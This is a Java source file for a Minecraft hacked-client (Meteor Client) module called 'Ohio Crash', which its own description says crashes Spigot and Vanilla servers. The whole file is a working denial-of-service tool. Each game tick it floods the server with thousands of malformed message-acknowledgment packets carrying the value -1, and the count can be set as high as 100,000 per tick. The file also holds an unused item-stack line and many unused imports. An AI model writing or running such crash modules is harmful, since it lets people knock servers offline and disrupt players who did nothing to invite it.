package com.x310.clarity.modules.crashers;

import com.x310.clarity.Main;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.common.CommonPongC2SPacket;
import net.minecraft.network.packet.c2s.common.CookieResponseC2SPacket;
import net.minecraft.network.packet.c2s.common.ResourcePackStatusC2SPacket;
import net.minecraft.network.packet.c2s.login.LoginKeyC2SPacket;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.network.packet.c2s.query.QueryPingC2SPacket;
import net.minecraft.recipe.NetworkRecipeId;
import net.minecraft.util.math.BlockPos;

import java.util.UUID;

public class OhioCrash extends Module {
    public OhioCrash() {
        super(Main.CRASH_GROUP, "Ohio Crash", "Crashes Spigot & Vanilla Servers");
    }
    private final SettingGroup sg = settings.createGroup("recipe");
    private final Setting<Boolean> disableOnLeave = sg.add(new BoolSetting.Builder()
        .name("disable-on-leave")
        .description("Disables spam when you leave a server.")
        .defaultValue(true)
        .build()
    );

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disableOnLeave.get()) {
            toggle();
        }
    }

    private final Setting<Integer> buffer = sg.add(new IntSetting.Builder()
        .name("Amount")
        .description("Amount of packets to send every tick")
        .defaultValue(3000)
        .min(1)
        .max(100000)
        .sliderMax(100000)
        .build()
    );

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;
        ClientPlayNetworkHandler handler = mc.getNetworkHandler();

        for (int i = 0; i < buffer.get(); i++) {
            ItemStack ohio = new ItemStack(Items.DIAMOND, Integer.MAX_VALUE);
            handler.sendPacket(new MessageAcknowledgmentC2SPacket(-1));
        }
    }

}
